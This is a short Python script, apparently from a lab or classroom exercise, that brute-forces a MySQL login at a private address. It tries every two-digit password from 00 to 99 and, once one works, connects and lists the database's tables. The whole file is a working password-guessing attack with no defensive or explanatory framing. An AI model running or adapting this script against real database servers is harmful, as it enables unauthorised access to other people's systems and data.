import mysql.connector
from mysql.connector import Error

host = "172.16.2.26"
database = "tateno2026"
user = "tateno2026"

#print("=" * 50)
print("Start password search from MySQL database.")
#print("=" * 50)

found = False

for i in range(100):
    password = f"{i:02d}"
    print(f"trying: {password}")

    try:
        connection = mysql.connector.connect(
            host=host,
            database=database,
            user=user,
            password=password,
            connection_timeout=3
        )

        print(f"\nPassword found: {password}")

        cursor = connection.cursor()
        cursor.execute("SHOW TABLES")
        tables = cursor.fetchall()

        print(f"\nContained in tables:")
        for table in tables:
            print(f"- {table[0]}")

        cursor.close()
        connection.close()
        found = True
        break

    except Error:
        continue

if not found:
    print("\nNot found")

print("\nProgram has terminated")